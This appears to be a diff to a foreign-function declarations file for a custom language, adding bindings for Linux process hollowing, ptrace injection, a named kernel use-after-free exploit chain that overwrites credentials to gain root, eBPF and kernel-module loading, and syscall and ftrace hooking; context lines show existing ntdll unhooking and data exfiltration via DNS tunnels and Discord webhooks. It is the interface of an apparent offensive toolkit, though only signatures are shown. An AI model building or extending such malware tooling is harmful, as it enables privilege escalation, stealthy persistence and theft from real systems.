@@ -15,6 +15,10 @@ ffi memcpy(dst: i8*, src: i8*, n: i64) -> i8*;
 ffi strlen(s: string) -> i64;
 ffi exit(code: i32) -> void;
 
+// ---- Array utilities ----
+ffi array_len(arr: i8*) -> i64;
+ffi array_append(arr: i8*, elem: i8*) -> i8*;
+
 // ---- Memory allocators ----
 ffi jocky_alloc(size: i64) -> i8*;
 ffi jocky_free(ptr: i8*) -> void;
@@ -136,3 +140,43 @@ ffi blindside_unhook_ntdll() -> bool;
 ffi exfil_dns_tunnel(domain: string, metadata: string) -> i32;
 ffi exfil_discord_webhook(webhook: string, message: string) -> i32;
 ffi exfil_local_cdn(endpoint: string, name: string, token: string, metadata: string) -> i32;
+
+// ---- Linux module loading ----
+ffi jocky_module_load(path: string) -> i8*;
+ffi jocky_module_unload(handle: i8*) -> bool;
+ffi jocky_module_has_symbol(handle: i8*, symbol: string) -> bool;
+ffi jocky_module_base(path: string) -> i64;
+ffi jocky_module_resolve_symbol(handle: i8*, symbol: string) -> i8*;
+
+// ---- Linux process operations ----
+ffi jocky_process_hollow_linux(pid: i32, payload: i8*, size: i64) -> bool;
+ffi jocky_process_ptrace_attach(pid: i32) -> i32;
+ffi jocky_process_ptrace_detach(pid: i32) -> i32;
+ffi jocky_process_get_maps(pid: i32, buf: i8*, bufsize: i64) -> i32;
+
+// ---- Linux kernel operations ----
+ffi jocky_fence2pwn_detect_kfence() -> i32;
+ffi jocky_fence2pwn_get_pool_info(info: i8*) -> i32;
+ffi jocky_fence2pwn_trigger_allocations(size: i64, count: i32) -> i32;
+ffi jocky_fence2pwn_exploit_uaf(alloc_idx: i32, free_idx: i32, data: i8*) -> i32;
+ffi jocky_fence2pwn_manipulate_creds(uid: i32, gid: i32) -> i32;
+ffi jocky_fence2pwn_allocate_cred_objects(count: i32) -> i32;
+ffi jocky_fence2pwn_write_cred(addr: i8*, uid: i32, gid: i32) -> i32;
+ffi jocky_fence2pwn_trigger_reclamation() -> i32;
+ffi jocky_fence2pwn_elevate_to_root() -> i32;
+ffi jocky_fence2pwn_find_uaf_primitive() -> i32;
+
+// ---- Linux eBPF and LKM ----
+ffi jocky_ebpf_load(prog: i8*, prog_size: i32, prog_type: i32) -> i32;
+ffi jocky_ebpf_attach(prog_fd: i32, attach_type: i32, target_fd: i32) -> i32;
+ffi jocky_ebpf_run(prog_fd: i32, ctx: i8*, ctx_size: i32) -> i64;
+ffi jocky_lkm_load(path: string, module_name: string) -> i32;
+ffi jocky_lkm_unload(module_name: string) -> i32;
+ffi jocky_lkm_get_symbol(module_name: string, symbol: string) -> i8*;
+
+// ---- Linux syscalls and advanced operations ----
+ffi jocky_syscall_hook(syscall_num: i32, handler: i8*) -> i32;
+ffi jocky_syscall_unhook(syscall_num: i32) -> i32;
+ffi jocky_syscall_trace(pid: i32) -> i32;
+ffi jocky_ftrace_attach(func_name: string, callback: i8*) -> i32;
+ffi jocky_ftrace_detach(func_name: string) -> i32;
